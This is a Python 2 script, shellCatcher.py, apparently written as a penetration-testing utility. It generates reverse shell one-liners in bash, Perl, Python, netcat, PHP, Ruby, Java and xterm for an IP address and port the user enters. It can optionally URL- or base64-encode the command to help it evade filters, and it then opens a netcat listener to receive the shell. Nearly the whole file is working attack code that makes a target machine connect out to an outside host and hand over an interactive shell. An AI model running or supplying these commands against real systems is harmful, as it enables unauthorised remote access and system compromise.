#!/usr/bin/python

# shellCatcher.py by khalphen [at] trustwave.com
# Generates selected reverse shell using
# provided information, then listens for
# it's execution on the port provided

# Many thanks to pentestmonkey for the 
# list of reverse shell one-liners!

import os, sys, urllib, base64, socket

def bashShell(ipAddress, portNumber):
	revShellString = "bash -i >& /dev/tcp/"+ipAddress+"/"+portNumber+" 0>&1"
	return revShellString

def perlShell(ipAddress, portNumber):
	revShellString = "perl -e 'use Socket;$i=\""+ipAddress+"\";$p="+portNumber+";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"))"+\
	";if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
	return revShellString

def pythonShell(ipAddress, portNumber):
	revShellString = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+ipAddress+\
	"\","+portNumber+"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
	return revShellString

def ncShell(ipAddress, portNumber):
        revShellString = "nc -e /bin/sh "+ipAddress+" "+portNumber
        return revShellString

def phpShell(ipAddress, portNumber):
	revShellString = "php -r '$sock=fsockopen(\""+ipAddress+"\","+portNumber+");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
	return revShellString

def rubyShell(ipAddress, portNumber):
	revShellString = "ruby -rsocket -e'f=TCPSocket.open(\""+ipAddress+"\","+portNumber+").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
	return revShellString

def javaShell(ipAddress, portNumber):
	revShellString = "r = Runtime.getRuntime()"
	revShellString += "p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/"+ipAddress+"/"+portNumber+";cat <&5 | while read line; do \$line"+\
	" 2>&5 >&5; done\"] as String[])"
	revShellString += "p.waitFor()"
	return revShellString

def xtermShell(ipAddress, portNumber):
	revShellString = "xterm -display "+ipAddress+":"+portNumber
	return revShellString

def printRevShellString(revShellString):
	print("\nReverse Shell String\n" + "="*40 + "\n" + revShellString + "\n" + "="*40)

def encodeTheString(revShellString, encodingType):
        if encodingType == "url":
                revShellString = urllib.quote(revShellString)
                return revShellString
        if encodingType == "base64":
                revShellString = base64.b64encode(revShellString)
                return revShellString

def spawnListener(portNumber):
	try:
		print("\nSpawning the listener on port " + portNumber)
                print("Waiting for connection...\n\n")
		os.system('sudo netcat -lvp ' + portNumber)
	except KeyboardInterrupt:
		pass

def main():

        startMsg = "Welcome to shellCatcher!\nPlease select a language to use from the list below:\n\n[0] Bash\n[1] PERL\n" + \
        "[2] Python\n[3] Netcat\n[4] PHP\n[5] Ruby\n[6] Java\n[7] xterm\n\n> "
        collectMsg = "\nPlease insert your IP address and port number\nex: 192.168.0.10:443\n\n> "

        selection = raw_input(startMsg)
        ipAddress, portNumber = raw_input(collectMsg).split(':')

	selection = int(selection)

        encodingType = int(raw_input("\nSelect an encoding. If you don't want one, select 0:\n[0] None\n[1] URL\n[2] Base64\n\n> "))

        if encodingType == 0:
                encodingType = "none"
        if encodingType == 1:
                encodingType = "url"
        if encodingType == 2:
                encodingType = "base64"

        if selection == 0:
                revShellString = bashShell(ipAddress, portNumber)
        elif selection == 1:
                revShellString = perlShell(ipAddress, portNumber)
        elif selection == 2:
                revShellString = pythonShell(ipAddress, portNumber)
        elif selection == 3:
                revShellString = ncShell(ipAddress, portNumber)
        elif selection == 4:
                revShellString = phpShell(ipAddress, portNumber)
        elif selection == 5:
                revShellString = rubyShell(ipAddress, portNumber)
        elif selection == 6:
                revShellString = javaShell(ipAddress, portNumber)
        elif selection == 7:
                revShellString = xtermShell(ipAddress, portNumber)

        if encodingType == "none":
                printRevShellString(revShellString)
        if encodingType == "url":
                revShellString = encodeTheString(revShellString, "url")
                printRevShellString(revShellString)
        if encodingType == "base64":
                revShellString = encodeTheString(revShellString, "base64")
                printRevShellString(revShellString)

        spawnListener(portNumber)

main()
